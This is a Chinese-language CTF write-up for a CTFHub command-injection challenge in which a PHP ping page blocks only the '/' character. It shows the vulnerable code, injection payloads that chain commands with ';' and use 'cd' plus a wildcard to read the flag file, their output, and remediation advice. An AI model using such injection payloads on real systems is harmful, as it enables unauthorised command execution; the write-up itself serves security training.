CTFHub - Web - 命令注入-过滤目录分隔符

# CTFHub # Web # RCE # 命令注入 # 目录分隔符绕过

一、题目信息

  • 题目名称：命令注入-过滤目录分隔符
  • 题目方向：Web - RCE
  • 运行环境：PHP + Linux
  • 题目目标：绕过目录分隔符 / 的过滤，读取 flag 目录下的动态 Flag 文件。

二、漏洞分析

页面源码显示，用户输入的 ip 被直接拼接到 ping 命令中。服务端仅通过正则表达式过滤目录分隔符 /：

<?php
$ip = $_GET['ip'];
$m = [];

if (!preg_match_all("/\//", $ip, $m)) {
    $cmd = "ping -c 4 {$ip}";
    exec($cmd, $res);
} else {
    $res = $m;
}
?>

该过滤同样没有移除命令分隔符 ;，也没有校验输入是否为合法 IP。虽然不能在 payload 中直接写入 /，但可以先使用 shell 内建命令 cd 切换工作目录，再通过相对文件名读取目标文件。

关键点是把绝对路径访问拆成多个相对路径操作：cd flag_is_here; cat *，全程不需要提交 /。

三、解题步骤

  1. 验证命令执行并查看当前目录： 
    127.0.0.1;pwd;ls -la

    响应显示当前工作目录为 /var/www/html，其中存在目标目录 flag_is_here：

    drwxr-xr-x    2 root     root          4096 Sep 23 11:37 flag_is_here
-rw-r--r--    1 root     root           676 Feb 20  2020 index.php
  2. 进入目标目录并枚举文件： 
    127.0.0.1;cd flag_is_here;ls -la

    目录中的 Flag 文件名由环境动态生成：

    -rw-r--r--    1 root     root            42 Sep 23 11:37 flag_266752528717025.php
  3. 使用通配符读取 Flag： 
    127.0.0.1;cd flag_is_here;cat *

    命令输出被 exec() 收集并通过 print_r() 回显：

    <?php // ctfhub{734063394ff5e4d8844ae8f6}

四、最终 Flag

ctfhub{734063394ff5e4d8844ae8f6}

五、修复建议

  • 严格校验输入：使用 filter_var($ip, FILTER_VALIDATE_IP) 校验目标地址，并拒绝命令分隔符、路径字符及其他 shell 元字符。
  • 不要拼接 Shell 命令：避免将用户输入直接传入 exec()；使用参数分离的安全 API，或对每个参数调用 escapeshellarg()。
  • 不要依赖单个字符黑名单：过滤 / 并不能阻止通过 cd、环境变量或通配符完成路径访问，输入校验应采用严格白名单。
  • 最小化权限：降低 Web 服务账户权限，并将 Flag 等敏感文件移出 Web 根目录及可读范围。
